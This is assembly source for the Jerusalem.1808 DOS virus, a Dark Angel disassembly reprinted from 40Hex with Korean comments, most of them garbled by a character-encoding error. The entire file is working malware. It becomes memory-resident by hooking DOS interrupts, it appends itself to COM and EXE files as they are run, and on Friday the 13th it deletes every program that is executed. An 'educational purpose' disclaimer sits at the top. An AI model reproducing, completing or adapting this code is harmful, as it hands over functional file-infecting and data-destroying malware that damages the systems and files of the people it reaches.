;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     Jerusalem.1808.Standard                 \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Jerusalem.1808.Standard
; Author     : ?
; Origin     : Israel / Italia (?)
; Date       : 1998/02/05
; Disassmebly by Dark Angel
; Corean Edition : Nambeol
;
; Type : Memory resident  COM/EXE
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �i�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;  40Hex Number 13 Volume 4 Issue 1                                    File 008
;
;  �� �a����a�� �b�� �����i �ťb�a�A ��Ё �e�a�e ��A �����i�Q �e�w �a����a�i
;  �A�b �i �� ���i �����a. 10 �e�� ���e �a����a���i �����a�a !
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

                .model  tiny
                .code
                org     0

; Jerusalem (Standard)
; Disassembly by Dark Angel of Phalcon/Skism
; �e�i ���� : Nambeol of CVL

viruslength     =       (endjerusalem - jerusalem) ; �a����a ����
jerusalem:
                jmp     enter_jerusalem
                db      'sU'                    ; ���� sURiv 3 �����a�� �e�a.
marker          db      'MsDos'                 ; �a����a �q�q �a�� �a��
COMdest         dw      0, 0                    ;
activate_flag   db      0                       ; �ɕ� �wȁ
zero            dw      0                       ;
filesize        dw      3                       ; COM �a�� �a��
oldint8         dw      0, 0                    ; ���� ������a 8h �����t
oldint21        dw      0, 0                    ; ���� ������a 21h �����t
oldint24        dw      0, 0                    ; ���� ������a 24h �����t
int8counter     dw      0                       ; �w�w �a����
tempheader      dw      0
EXEdest         dw      0,0                     ;
_initialSP      dw      0                       ;
_initialSS      dw      0                       ;
_headersize     dw      0                       ;
_filelengthlo   dw      0                       ;
_filelengthhi   dw      0                       ;
savePSP1        dw      0                       ; PSP �t
respara         dw      80h                     ; ��З�i ���e �ŉw �A���� �w�b

parmblock:
                dw      0 ; use current environment
                dw      80h
savePSP2        dw      0 ; pointer to command line
                dw      5Ch
savePSP3        dw      0 ; pointer to 1st FCB
                dw      6Ch
savePSP4        dw      0 ; pointer to 2nd FCB
saveSP          dw      0                       ; SP
saveSS          dw      0                       ; SS
initialCSIP     dw      0, 0                    ; CS,IP

oldintFF        dw      0                       ; ���� Int FFh ���w
                db      0
COM_EXE_flag    db      0
header          dw      0Eh dup (0)
readbuffer      db      5 dup (0)               ; �q�q�a���i �·� ���e ����
filehandle      dw      0                       ; �a�� Ѕ�i
fileattr        dw      0                       ; �a�� ����
filedate        dw      0                       ; �a�� �i�a
filetime        dw      0                       ; �a�� ���e
pagesize        dw      200h                    ; 512 (�A���� �a��)
parasize        dw      10h                     ; paragraph->byte conversion
filelength      dw      0, 0                    ; �a�� ����
filenameptr     dw      0, 0                    ; �a�����q
command_com     db      'COMMAND.COM'           ; �q�q �A�A �a��
alloc_flag      dw      0                       ; �A���� �i�w �a�� �i���a
                db      0, 0, 0, 0

enter_jerusalem:
                cld
                mov     ah,0E0h                 ;
                int     21h                     ; �w�� �a�� ��a
                cmp     ah,0E0h
                jae     not_resident
                cmp     ah,3                    ; AH �a 3 ���e �w��Ё���a.
                jb      not_resident

                mov     ah,0DDh                 ; COM ��З
                mov     di,100h                 ; DI= 100h
                mov     si,offset endjerusalem  ; SI= ���� �a���a�� ���b��
                add     si,di                   ;     (�a������ + 100h)
                mov     cx,cs:[di+filesize]     ; CX= ���� �a���a�� ����
                int     21h                     ; ����á ��З
not_resident:
                mov     ax,cs                   ;
                add     ax,10h                  ; EXE �A�a���a ɷ��Ё�� ���a
                mov     ss,ax                   ;
                mov     sp,700h                 ;
                push    ax
                mov     ax,offset relocate_entry
                push    ax
                retf

;
; �� �a����a�e 0 �廡�A�� ��З�A���� �A�b�A���a. �a���e, COM �a���e 100h �A��
; ��З�A�a�� �A�a���a�i + 10h Ё���� COM �a���� 0 �廡�A�� ��З�A�e �� ��� �e
; �� �A ���a.
; 0000:0100h �� 0010:0000h �e �锁�����A�� �{�q�i ���b�a�� �a�e�a. ��Ё�a �e�A
; �e ����ᝡ ���� ����Ё ���� �a�e�a.
;
relocate_entry:                                 ; EXE �a�� ���b��
                cld
                push    es
                mov     cs:savePSP1,es          ;
                mov     cs:savePSP2,es          ; PSP ��w
                mov     cs:savePSP3,es          ;
                mov     cs:savePSP4,es          ;
                mov     ax,es
                add     ax,10h                  ;
                add     cs:initialCSIP+2,ax     ;
                add     cs:saveSS,ax
                mov     ah,0E0h                 ; �w�� �a�� ��a
                int     21h
                cmp     ah,0E0h
                jae     install_virus
                cmp     ah,3
                pop     es
                mov     ss,cs:saveSS            ; ���� EXE �a���a�� ��З
                mov     sp,cs:saveSP
                jmp     dword ptr cs:initialCSIP
install_virus:
                xor     ax,ax                   ;
                mov     es,ax                   ; ������a FFh �� �t�A
                mov     ax,es:0FFh*4            ; rep movsw / retf �i ��w�e�a.
                mov     cs:oldintFF,ax          ;
                mov     al,es:0FFh*4+2          ;
                mov     byte ptr cs:oldintFF+2,al
                mov     word ptr es:0FFh*4,0A5F3h ; rep movsw
                mov     byte ptr es:0FFh*4+2,0CBh ; retf
                pop     ax                      ; COM �a���� �w�� �a �A���� �a
                add     ax,10h                  ; ���� ����á�E�a.
                mov     es,ax
                push    cs
                pop     ds
                mov     cx,viruslength          ; �a����a ����
                shr     cx,1                    ; �a����a ���� / 2
                xor     si,si
                mov     di,si
                push    es
                mov     ax,offset return_here
                push    ax
                db      0EAh                    ; jmp far ptr
                dw      03FCh, 0                ; JMP 0000:03FCh
return_here:
                mov     ax,cs                   ; ���a �{�eҁ �����a�� ���a�e�a.
                mov     ss,ax
                mov     sp,700h                 ; �aȂ ����
                xor     ax,ax
                mov     ds,ax
                mov     ax,cs:oldintFF          ; Int FFh ����
                mov     ds:0FFh*4,ax
                mov     al,byte ptr cs:oldintFF+2
                mov     ds:0FFh*4+2,al
                mov     bx,sp                   ; �A���� �i�w
                mov     cl,4                    ; SP(700) / 2 ^ 4 = ́��a��ϡ
                shr     bx,cl                   ; �e��
                add     bx,10h                  ; 10h �e PSP �a�� ���a. 256 byte
                mov     cs:respara,bx           ;
                mov     ah,4Ah                  ; �a����a�a ϩ�a�e �e�q�e �A��
                mov     es,cs:savePSP1          ; ���i �����a.
                int     21h                     ;
;
; �A���� �i�w ������ ��Ё�a �i �e�A�e �ŝe ���a�� �����i ���a�� �a�e�a.
;
                mov     ax,3521h                ; ������a 21h ���� �苡
                int     21h                     ;
                mov     cs:oldint21,bx          ; ��w
                mov     word ptr cs:oldint21+2,es

                push    cs                      ; �a����a�a �a���e ������a
                pop     ds                      ; 21h Ѕ�i�ᝡ �a���a.
                mov     dx,offset int21
                mov     ax,2521h
                int     21h

                mov     es,savePSP1             ; PSP ��w
                mov     es,es:2Ch               ; �ŉw�w�b �A�a���a�i ��e�a.
                xor     di,di                   ; PSP:002Ch �A �����a �i�� ��
                mov     cx,7FFFh                ; �a.
                xor     al,al                   ;
scan_environment:                               ; �ŉw�w�b ��á �b�� ���i
                repne   scasb                   ; �q�� �a�� �a�e�a.
                cmp     es:[di],al              ;
                loopnz  scan_environment        ;

                mov     dx,di                   ;
                add     dx,3                    ; ��З�i �a�����q�i ��e�a. ��
                mov     ax,4B00h                ; �w�w�b���A ���a.
                push    es
                pop     ds
                push    cs
                pop     es
                mov     bx,offset parmblock
                push    ds
                push    es
                push    ax
                push    bx
                push    cx
                push    dx
                mov     ah,2Ah                  ; �i�a �苡
                int     21h

                mov     cs:activate_flag,0      ;
                cmp     cx,1987d                ; 1987 �e�A�e �b���e�e�a.
                je      no_activate
                cmp     al,5                    ; �q�a�����a ?
                jne     set_int8
                cmp     dl,13d                  ; 13 �� ���a ?
                jne     set_int8
                inc     cs:activate_flag        ; �a��e �b���e�a.
                jmp     short no_activate
                db      90h
set_int8:                                       ; Int 8h �i ��w�e�a.
                mov     ax,3508h                ;
                int     21h
                mov     cs:oldint8,bx
                mov     word ptr cs:oldint8+2,es

                push    cs
                pop     ds                      ;
                mov     int8counter,60*30*18    ; ���e ��� (30��ҁ)
                mov     ax,2508h                ;
                mov     dx,offset int8
                int     21h
no_activate:
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds
                pushf
                call    dword ptr cs:oldint21   ; ���� �a���a�� ��З
                push    ds
                pop     es
                mov     ah,49h                  ; �A���� Ё�A
                int     21h

                mov     ah,4Dh                  ; �A��t �苡
                int     21h

                mov     ah,31h                  ; ���� �a���a�� ��Зҁ ����w��
                mov     dx,600h                 ; �A �a����a �w���q
                mov     cl,4
                shr     dx,cl
                add     dx,10h
                int     21h

int24:
                xor     al,al
                iret

int8:
                cmp     cs:int8counter,2        ; ********************
                jne     no_box                  ;       Int 8h
                push    ax                      ; ********************
                push    bx                      ;
                push    cx
                push    dx
                push    bp
                mov     ax,602h                 ; scroll up 2 lines
                mov     bh,87h                  ; (5,5) - (10,10)
                mov     cx,505h
                mov     dx,1010h
                int     10h                     ; �a�a�� �a��

                pop     bp
                pop     dx
                pop     cx
                pop     bx
                pop     ax
no_box:
                dec     cs:int8counter
                jnz     exitint8
                mov     cs:int8counter,1
                push    ax
                push    cx
                push    si
                mov     cx,4001h                ; ���e��ǡ��
                rep     lodsb
                pop     si
                pop     cx
                pop     ax
exitint8:
                jmp     dword ptr cs:oldint8    ; ���� ������a 8 ��З

int21:
                pushf
                cmp     ah,0E0h                 ; �w�� �a�� ��a ���a ?
                jne     not_install
                mov     ax,300h                 ; �w���t ����
                popf
                iret
not_install:
                cmp     ah,0DDh                 ; COM ����á
                je      restore_COM
                cmp     ah,0DEh                 ; EXE ����á (���A���e �a�w�e�E
                je      restore_EXE             ; �a.)
                cmp     ax,4B00h                ; ��З���a ?
                jne     exitint21
                jmp     execute
exitint21:
                popf
                jmp     dword ptr cs:oldint21
restore_COM:                                    ; ���� COM �A�����A ����á
                pop     ax                      ; pushf Ж�� �t
;
; ������a�a ѡ�A�e �i���a,CS,IP  ���a�� ��w�E�a. �a���� ���� ������a�a ѡ
; �E ���i �i�� ��Ё��e CS �t�e �i�e�E�a.
;
                pop     ax                      ; IP �t
                mov     ax,100h                 ;
                mov     cs:COMdest,ax           ;
                pop     ax                      ; �a���a�� CS �苡
                mov     word ptr cs:COMdest+2,ax
                rep     movsb                   ; ����á
                popf                            ;
                mov     ax,cs:zero              ; clear AX
                jmp     dword ptr cs:COMdest    ; ���� �a���a���a�� ���a
                                                ; CS:100h �� ���a�e�a.
restore_EXE:
                add     sp,6                    ; EXE ����á
                popf                            ; �a����a �A�b�a�� �����e
                mov     ax,cs                   ; EXE �a���� �|�����A �a����a
                mov     ss,ax                   ; �i ��á�a�a�� �e�� �{�a. �a��
                mov     sp,offset endjerusalem  ; �e �� ��˥�e �a�w�A�� �g�e�a.
                push    es                      ; �� ��˥�e ϩ�a ���a.
                push    es
                xor     di,di
                push    cs
                pop     es
                mov     cx,10h
                mov     si,bx
                mov     di,offset tempheader
                rep     movsb
                mov     ax,ds
                mov     es,ax
                mul     cs:parasize             ; convert to bytes
                add     ax,cs:_headersize
                adc     dx,0
                div     cs:parasize             ; convert to paragraphs
                mov     ds,ax
                mov     si,dx
                mov     di,dx
                mov     bp,es
                mov     bx,cs:_filelengthhi
                or      bx,bx
                jz      no_move_code
move_code:
                mov     cx,8000h
                rep     movsw
                add     ax,1000h
                add     bp,1000h
                mov     ds,ax
                mov     es,bp
                dec     bx
                jnz     move_code
no_move_code:
                mov     cx,cs:_filelengthlo
                rep     movsb
                pop     ax
                push    ax
                add     ax,10h
                add     cs:_initialSS,ax
                add     word ptr cs:EXEdest+2,ax
                mov     ax,cs:tempheader
                pop     ds
                pop     es
                mov     ss,cs:_initialSS
                mov     sp,cs:_initialSP
                jmp     dword ptr cs:EXEdest

delete_file:
                xor     cx,cx                   ; ����/�a���� ���� �e�w
                mov     ax,4301h
                int     21h

                mov     ah,41h                  ; �a�� �b�A
                int     21h

                mov     ax,4B00h                ; �a���a�� ��З
                popf                            ; �w�eӡ �a���� ���a�a�� ���A
                jmp     dword ptr cs:oldint21   ; �i��

execute:
                cmp     cs:activate_flag,1      ; 13���� �q�a�� ���a ?
                je      delete_file
                mov     cs:filehandle,0FFFFh    ; �a�� Ѕ�i��w (�a���� ���e�A�e
                                                ; ���w���e �a�� Ѕ�i�� ��w�E�a)
                mov     cs:alloc_flag,0         ;
                mov     cs:filenameptr,dx       ; �a�� ���q
                mov     word ptr cs:filenameptr+2,ds ; DS:DX
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                cld
                mov     di,dx
                xor     dl,dl
                cmp     byte ptr [di+1],':'     ; �a�a���a ���a ?
                jne     execute_nodrive
                mov     dl,[di]                 ; �a�a���a �苡
                and     dl,1Fh                  ; ���a�i ���a�� �a��
execute_nodrive:
                mov     ah,36h                  ; ���w���� ��a���a ?
                int     21h
                cmp     ax,0FFFFh               ; �A�ᷥ�a ?
                jne     check_drivespace
go_exit_execute:
                jmp     exit_execute
check_drivespace:
                mul     bx                      ; ax = clus/sec, bx=free clus
                mul     cx                      ; cx = bytes/sector
                or      dx,dx                   ; check if enough free space
                jnz     enough_space            ; �a����a ���� ���w�� �����e��
                cmp     ax,viruslength          ; ���e�a ?
                jb      go_exit_execute
enough_space:
                mov     dx,cs:filenameptr       ;
                push    ds
                pop     es
                xor     al,al                   ;
                mov     cx,41h
                repne   scasb
                mov     si,cs:filenameptr
uppercase_loop:
                mov     al,[si]                 ;
                or      al,al                   ; �a�� ���q �{���a ?
                jz      uppercase_loop_done
                cmp     al,'a'                  ;
                jb      not_lower               ; �����a�i �����a�� �a���a.
                cmp     al,'z'                  ;
                ja      not_lower               ;
                sub     byte ptr [si],' '       ; - 20h (�����a�� �����a�e
                                                ;        20h �� �a���a ���a.)
not_lower:
                inc     si
                jmp     short uppercase_loop
uppercase_loop_done:
                mov     cx,0Bh                  ; �a�� ���q�� COMMAND.COM
                sub     si,cx                   ; ���a ?
                mov     di,offset command_com
                push    cs
                pop     es
                mov     cx,0Bh
                repe    cmpsb
                jnz     not_command_com
                jmp     exit_execute
not_command_com:
                mov     ax,4300h                ; ���� �苡
                int     21h
                jc      error1
                mov     cs:fileattr,cx
error1:
                jc      error2
                xor     al,al
                mov     cs:COM_EXE_flag,al      ;
                push    ds
                pop     es
                mov     di,dx
                mov     cx,41h
                repne   scasb                   ; COM ���� ��a�e�a. ���� ����
                cmp     byte ptr [di-2],'M'     ; �a�� �e�ŖA���a�a�� �����a ��
                je      EXEidentified           ; �a�e ϩ�a ���a�a �e��ӡ �¸w
                cmp     byte ptr [di-2],'m'     ; �a �e�a�� ��a �a�a�� ���A�a
                je      EXEidentified           ; ���a.
                inc     cs:COM_EXE_flag         ; EXE �a�����a�� �w�a
EXEidentified:
                mov     ax,3D00h                ; �a�� ���e
                int     21h
error2:
                jc      error3
                mov     cs:filehandle,ax
                mov     bx,ax
                mov     ax,4202h                ; �a���{ - 5 �� ����
                mov     cx,0FFFFh
                mov     dx,0FFFBh
                int     21h
                jc      error2

                add     ax,5                    ; +5 Ё�� �a�� ���� ��q
                mov     cs:filesize,ax
                mov     cx,5                    ; 5 �a���a ����
                mov     dx,offset readbuffer
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     ah,3Fh
                int     21h

                mov     di,dx                   ; MsDos ���a ?
                mov     si,offset marker        ; EXE �a���A �q�q�I�� MsDos �i
                repe    cmpsb                   ; ��w�a�� �g�a �����q�q�E�a.
                jnz     not_infected            ;
                mov     ah,3Eh                  ; �a�� �h��
                int     21h

                jmp     exit_execute
not_infected:
                mov     ax,3524h                ; ������a 24h ���� �苡
                int     21h
                mov     oldint24,bx             ; ��w
                mov     word ptr oldint24+2,es

                mov     dx,offset int24         ; ������ Int 24h �� �a��
                mov     ax,2524h
                int     21h

                lds     dx,dword ptr filenameptr; �a����a ���q �苡
                xor     cx,cx                   ; �����i ����/�a���� �a��
                mov     ax,4301h
                int     21h
error3:
                jc      error4
                mov     bx,cs:filehandle
                mov     ah,3Eh                  ; �a�� �h��
                int     21h

                mov     cs:filehandle,0FFFFh    ; �A�ᯡ FFFFh �a �i�᷶�a.
                mov     ax,3D02h                ; ����/�a���� �a�� ���e
                int     21h                     ; ���w ���e���e AX �A �a��Ѕ�i
                jc      error4                  ; �� ���a���a.

                mov     cs:filehandle,ax        ; Ѕ�i ��w
                mov     ax,cs
                mov     ds,ax
                mov     es,ax
                mov     bx,filehandle
                mov     ax,5700h                ; �a���� �b����/���e �苡
                int     21h
                mov     filedate,dx             ; ��w
                mov     filetime,cx

                mov     ax,4200h                ; �a�� ��q�a�� ����
                xor     cx,cx
                mov     dx,cx
                int     21h
error4:
                jc      error5
                cmp     COM_EXE_flag,0          ; COM ���a ?
                je      infect_com
                jmp     short infect_exe
                db      90h
infect_com:                                     ; COM �q�q��˥
                mov     bx,1000h                ; �A���� �苡 (64KB)
                mov     ah,48h
                int     21h
                jnc     allocation_fine

                mov     ah,3Eh                  ; �A��e �a�� �h��
                mov     bx,filehandle
                int     21h

                jmp     exit_execute
allocation_fine:
                inc     alloc_flag
                mov     es,ax                   ; �� ����A �a����a ���a
                xor     si,si
                mov     di,si
                mov     cx,viruslength
                rep     movsb
                mov     dx,di
                mov     cx,filesize             ; ���� COM �a�� �e�q �a�� ����
                mov     bx,filehandle           ; �i����
                push    es
                pop     ds
                mov     ah,3Fh                  ;
                int     21h
error5:
                jc      error6
                add     di,cx
                xor     cx,cx                   ; �a�� ���b�a�� ����
                mov     dx,cx
                mov     ax,4200h
                int     21h

                mov     si,offset marker        ; �a�� �{�A �a����a ���i�a����
                mov     cx,5
                rep     movs byte ptr es:[di],cs:[si]
                mov     cx,di                   ;
                xor     dx,dx
                mov     ah,40h
                int     21h
error6:
                jc      error7
                jmp     error12
infect_exe:
                mov     cx,1Ch                  ; EXE �A�� ����
                mov     dx,offset header
                mov     ah,3Fh
                int     21h
error7:
                jc      error8
                mov     word ptr ds:header+12h,1984h ; ???
                mov     ax,ds:header+0eh; initial SS
                mov     ds:saveSS,ax
                mov     ax,ds:header+10h        ; initial SP
                mov     ds:saveSP,ax
                mov     ax,ds:header+14h
                mov     ds:initialCSIP,ax
                mov     ax,ds:header+16h
                mov     ds:initialCSIP+2,ax
                mov     ax,ds:header+4          ;
                cmp     word ptr ds:header+2,0  ;
                je      not_rounded
                dec     ax                      ;
not_rounded:
                mul     word ptr ds:pagesize
                add     ax,ds:header+2
                adc     dx,0                    ; �a�� �a�� �苡
                add     ax,0Fh                  ; 16 �� ������ �e�e�a.
                adc     dx,0
                and     ax,0FFF0h               ;
                mov     ds:filelength,ax
                mov     ds:filelength+2,dx
                add     ax,viruslength          ; + �a����a ����
                adc     dx,0
error8:
                jc      error9
                div     word ptr ds:pagesize    ; �A���� �a���� �a���a.
                or      dx,dx                   ; �a�ỡ�a �����a�a ?
                jz      dont_round
                inc     ax
dont_round:
                mov     ds:header+4,ax          ; �� Ё�� �a��
                mov     ds:header+2,dx
                mov     ax,ds:filelength        ; convert filesize
                mov     dx,ds:filelength+2
                div     word ptr ds:parasize    ; to paragraphs
                sub     ax,ds:header+8          ; subtract header size
                mov     ds:header+16h,ax        ; insert as initial CS
                mov     word ptr ds:header+14h,offset relocate_entry
                mov     ds:header+0eh,ax        ; insert new stack segment
                mov     word ptr ds:header+10h,offset endjerusalem; & pointer

                xor     cx,cx                   ; �a�� ���b�a�� ����
                mov     dx,cx
                mov     ax,4200h
                int     21h
error9:
                jc      error10
                mov     cx,1Ch                  ; �a�� �A�� �a��
                mov     dx,offset header
                mov     ah,40h
                int     21h
error10:
                jc      error11
                cmp     ax,cx
                jne     error12

                mov     dx,ds:filelength        ; �a�� �{�a�� ����
                mov     cx,ds:filelength+2
                mov     ax,4200h
                int     21h
error11:
                jc      error12
                xor     dx,dx                   ; �a����a �a��
                mov     cx,viruslength
                mov     ah,40h
                int     21h
error12:
                cmp     cs:alloc_flag,0         ; �A�����i �i�w Ж���a ?
                je      no_free                 ;
                mov     ah,49h                  ; �A���� Ё�A
                int     21h
no_free:
                cmp     cs:filehandle,0FFFFh    ; �A�� ���a ? (�a���� ���e�A��
                je      exit_execute            ; �g�v�a.)
                mov     bx,cs:filehandle        ; �a���b�� �i�a/���e �苡
                mov     dx,cs:filedate
                mov     cx,cs:filetime
                mov     ax,5701h
                int     21h

                mov     ah,3Eh                  ; �a�� �h��
                int     21h

                lds     dx,dword ptr cs:filenameptr
                mov     cx,cs:fileattr
                mov     ax,4301h                ; ���� ����
                int     21h

                lds     dx,dword ptr cs:oldint24; Int 24h ����
                mov     ax,2524h
                int     21h
exit_execute:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     dword ptr cs:oldint21
; slack space for stack here                    ; �aȂ
                org     710h
endjerusalem:
                nop
                int     20h                     ; ���� �a���a�� (3 �a���a)
                db      'MsDos'                 ; �a����a �q�q�a��

                end     jerusalem

